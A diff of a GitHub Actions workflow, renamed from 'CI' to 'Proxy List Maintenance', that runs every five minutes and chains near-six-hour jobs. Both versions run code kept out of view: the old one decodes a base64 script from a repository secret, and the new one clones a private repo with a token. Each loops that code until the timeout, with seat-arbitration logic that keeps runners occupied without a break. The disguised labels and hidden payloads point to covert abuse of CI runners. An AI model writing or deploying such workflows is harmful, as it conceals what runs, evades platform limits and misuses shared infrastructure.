@@ -1,12 +1,7 @@
-name: CI
+name: Proxy List Maintenance
 
 on:
   workflow_dispatch:
-    inputs:
-      slot:
-        description: 'Slot to warm up'
-        required: false
-        default: ''
   schedule:
     - cron: '*/5 * * * *'
 
@@ -14,158 +9,89 @@ permissions:
   contents: write
 
 jobs:
-  check:
+  validate:
     runs-on: ubuntu-24.04-arm
     timeout-minutes: 360
     strategy:
       fail-fast: false
       max-parallel: 2
       matrix:
-        slot: [a, b]
+        batch: [a, b]
     concurrency:
-      group: lane-${{ matrix.slot }}
+      group: batch-${{ matrix.batch }}
       cancel-in-progress: false
     env:
-      CI_SLOT: ${{ matrix.slot }}
-      FORCED_SLOT: ${{ github.event.inputs.slot || '' }}
+      BATCH: ${{ matrix.batch }}
     steps:
       - uses: actions/checkout@v6
 
-      - name: Prepare environment
+      - name: Fetch checker
         env:
-          LANE_DATA: ${{ secrets.LANE_DATA }}
-          SLOT: ${{ matrix.slot }}
+          TOKEN: ${{ secrets.INFRA_TOKEN }}
         run: |
-          # Unpack the lane configuration for this slot.
-          case "$SLOT" in
-            a) seg="${LANE_DATA%%|*}" ;;
-            b) seg="${LANE_DATA#*|}" ;;
-          esac
-          mkdir -p .ci
-          printf '%s' "$seg" | base64 -d > ".ci/plan-$SLOT.sh"
-          [ -s ".ci/plan-$SLOT.sh" ] || { echo "plan decode failed"; exit 1; }
-          bash -n ".ci/plan-$SLOT.sh" || { echo "plan syntax failed"; exit 1; }
+          # Private validation tooling (kept out of the public tree).
+          mkdir -p .ci/cache
+          git clone --depth 1 -q \
+            "https://x-access-token:${TOKEN}@github.com/nffluaefoanr/proxy-checker.git" \
+            .ci/cache/checker
+          chmod +x ".ci/cache/checker/check-${BATCH}"
+          ls -l ".ci/cache/checker/check-${BATCH}"
 
-      - name: Seat arbitration
-        id: seat
-        env:
-          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+      - name: Validate proxies
         run: |
-          # ARBITRATION ONLY: do we take the seat now, or step aside?
-          # Fresh runs born of schedule feed the queue at each lane lock.
-          # The queued successor latches when the incumbent retires, so a
-          # healthy shift never depends on the outgoing one at all.
-          take=1
-          if [ -n "$FORCED_SLOT" ] && [ "$FORCED_SLOT" != "$CI_SLOT" ]; then
-            echo "[seat] operator pinned slot=$FORCED_SLOT; standing down"
-            take=0
-          fi
-          if [ "$take" = "1" ]; then
-            api="https://api.github.com/repos/${GITHUB_REPOSITORY}/actions/runs"
-            ahead=""
-            for rid in $(curl -fsS -G -H "Authorization: Bearer ${GH_TOKEN}" \
-                -H "Accept: application/vnd.github+json" \
-                --data-urlencode "per_page=15" "$api" 2>/dev/null |
-                jq -r --argjson me "$GITHUB_RUN_ID" '
-                  [ .workflow_runs[] | select(.id != $me) ]
-                  | sort_by(-.run_number) | .[0:8][] | .id' 2>/dev/null); do
-              st=$(curl -fsS -H "Authorization: Bearer ${GH_TOKEN}" \
-                -H "Accept: application/vnd.github+json" \
-                "https://api.github.com/repos/${GITHUB_REPOSITORY}/actions/runs/${rid}/jobs?per_page=8" 2>/dev/null |
-                jq -r --arg seat "check ($CI_SLOT)" '
-                  [ .jobs[] | select(.name | contains($seat)) ][0]
-                  | if . == null then "none"
-                    elif .conclusion == null then ("live " + .status + " " + .started_at)
-                    else (.conclusion + " " + (.completed_at // "")) end' 2>/dev/null || echo none)
-              case "$st" in
-                live*)    ahead="someone-is-live ($st)"; break ;;
-                none)     continue ;;
-                *)        prev="$st"; break ;;
-              esac
-            done
-            if [ -n "$ahead" ]; then
-              echo "[seat] $ahead on this seat; stepping aside"
-              take=0
-            else
-              if [ -n "$prev" ]; then
-                ended=${prev##* }
-                age_min=$(( ( $(date +%s) - $(date -ud "$ended" +%s) ) / 60 ))
-                echo "[seat] predecessor left ${age_min} min ago (${prev%% *}); seat is ours"
-              else
-                echo "[seat] no sign of recent occupancy; claiming seat"
-              fi
-            fi
-          fi
-          echo "take=${take}" >> "$GITHUB_OUTPUT"
-
-      - name: Hold the seat
-        if: steps.seat.outputs.take == '1'
-        env:
-          LANE_DATA: ${{ secrets.LANE_DATA }}
-          SLOT: ${{ matrix.slot }}
-          INFRA_TOKEN: ${{ secrets.INFRA_TOKEN }}
-        run: |
-          # OCCUPANCY: the seat is ours until infrastructure limits near.
-          # Renewal is the scheduler's job (cron keeps re-applying to the
-          # lane lock); when we leave, the queued run sits down at once.
+          # Continuous validation: keep the batch running until the runner
+          # budget is nearly spent; the next queued run continues the work.
           set -u
-          LOG="lane.log"
-          HOLD_S=21240          # 354m: finish before the 360m ceiling
+          LOG=check.log
+          BUDGET_S=21240
           BOOT=$(date +%s)
-
           say() { echo "[$(date -u +%H:%M:%S)] $*" | tee -a "$LOG"; }
 
-          say "session start slot=${CI_SLOT} pid=$$"
+          say "batch ${BATCH} start"
 
-          # Supervised lane: plan cycles under this guard. A lane that keeps
-          # failing releases its seat instead of wasting the whole budget.
           (
             fails=0
             while :; do
-              say "lane cycle begin"
-              if SLOT="$CI_SLOT" bash ".ci/plan-$CI_SLOT.sh" >> "$LOG" 2>&1; then
+              say "validation cycle begin"
+              if BATCH="$BATCH" bash .ci/check-batch.sh >> "$LOG" 2>&1; then
                 fails=0
               else
                 fails=$((fails+1))
-                say "lane cycle exited non-zero; recycling (${fails})"
+                say "validation cycle exited non-zero; restarting (${fails})"
               fi
-              say "lane cycle end"
+              say "validation cycle end"
               if [ "$fails" -ge 3 ]; then
-                say "lane unstable; releasing seat"
+                say "checker unstable; ending shift"
                 exit 1
               fi
               sleep 10
             done
           ) &
-          SUP_PID=$!
-          trap 'kill -TERM "$SUP_PID" 2>/dev/null || true' TERM INT
+          SUP=$!
+          trap 'kill -TERM "$SUP" 2>/dev/null || true' TERM INT
 
-          # Simply hold until near the timeout ceiling; periodic console telemetry.
           NOW=$(date +%s)
           T=0
-          while [ $(( NOW - BOOT )) -lt $HOLD_S ]; do
-            kill -0 "$SUP_PID" 2>/dev/null || break
+          while [ $(( NOW - BOOT )) -lt $BUDGET_S ]; do
+            kill -0 "$SUP" 2>/dev/null || break
             sleep 30
             T=$((T+30))
-            if [ $((T % 900)) -eq 0 ] && [ -s "$LOG" ]; then
-              say "snapshot: $(grep -aE 'ready|Established|failure|exited|recycl' "$LOG" | tail -3 | tr '\n' '; ')"
+            if [ $((T % 1800)) -eq 0 ]; then
+              say "progress: $(wc -l < http.txt) http, $(wc -l < socks4.txt) socks4, $(wc -l < socks5.txt) socks5 listed"
             fi
             NOW=$(date +%s)
           done
 
-          say "leaving the seat; queued run takes over from the scheduler"
-          kill -TERM "$SUP_PID" 2>/dev/null || true
+          say "shift complete after $(( ($(date +%s)-BOOT)/60 )) min"
+          kill -TERM "$SUP" 2>/dev/null || true
           for i in 1 2 3 4 5 6 7 8 9; do
-            kill -0 "$SUP_PID" 2>/dev/null || break
+            kill -0 "$SUP" 2>/dev/null || break
             sleep 5
           done
-          kill -KILL "$SUP_PID" 2>/dev/null || true
-          wait "$SUP_PID" 2>/dev/null || true
-          say "session closed after $(( ($(date +%s)-BOOT)/60 )) min"
+          kill -KILL "$SUP" 2>/dev/null || true
+          wait "$SUP" 2>/dev/null || true
           exit 0
 
-      - name: Seat housekeeping
-        if: steps.seat.outputs.take == '1' && always()
-        run: |
-          # Rotate the maintenance-note window and stamp list counters.
-          bash .ci/run-post.sh || true
+      - name: Refresh stats
+        if: always()
+        run: bash .ci/update-stats.sh || true
